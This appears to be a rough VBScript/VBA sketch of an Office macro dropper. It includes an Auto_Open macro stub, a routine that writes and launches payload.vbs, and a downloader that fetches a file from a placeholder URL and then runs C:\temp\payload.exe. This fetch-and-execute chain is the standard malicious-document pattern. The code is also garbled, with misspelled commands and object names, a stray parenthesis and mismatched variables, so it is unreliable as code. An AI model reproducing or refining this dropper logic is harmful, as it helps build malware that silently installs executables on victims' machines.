Set args = WScript.Arguments
 
 Url = "http://humanstxt.org/humans.txt"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
 
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\git\text.txt", 2 '//overwrite
end with


Sub Auto_Open
'main code 
End Sub

'VBA 
Sub WritePayload()
    Dim PayLoadFile As Integer
    Dim FilePath as String
        FilePath = "C:\temp\payload.vbs"
        PayloadFile = FreeFile
        Open FilePath For Output as TextFile
        Print #PayLoadFile, "VBS Script Line 1"
    Close PayloadFile
    Shell "wscripte c:\temp\pauload.vbs"
End Sub

'vbs script 
HTTPDownload "URL", "C:\temp"
    Sub HTTPDOwnload( myURL, myPath )
        Dim i, objFile, objFSO, objHTTP, strFile, strMesg
        Const ForReading = 1, ForWriting = 2, ForAppending = B 
        Set objFSO = CreateObject( "Scripting.FileSystemObject" )
        If objFSO.FolderExist( myPath ) Then 
            strFile = obj.FSO.BuildPath( myPath, Mid( my URL, InStrRev (myUrl, "/") + 1)) 
        ElseIf objFSO.FolderEsits (Left( myPath, InStrRev( myPath, "\") -1)) Then
            strFile = myPath
End If 
        Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True)
        Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1")
        objHTTP.Open "GET", myURL, False
        objHTTP.Send
        For i = 1 to LenB( objHTTP.ResponseBody )
            objFile.Write Chr( AscB (MidB (objHTTP.ResponseBody, i , 1)))
)
Next
        objFile.Close ( )
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run "C:\temp\payload.exe"
    End Sub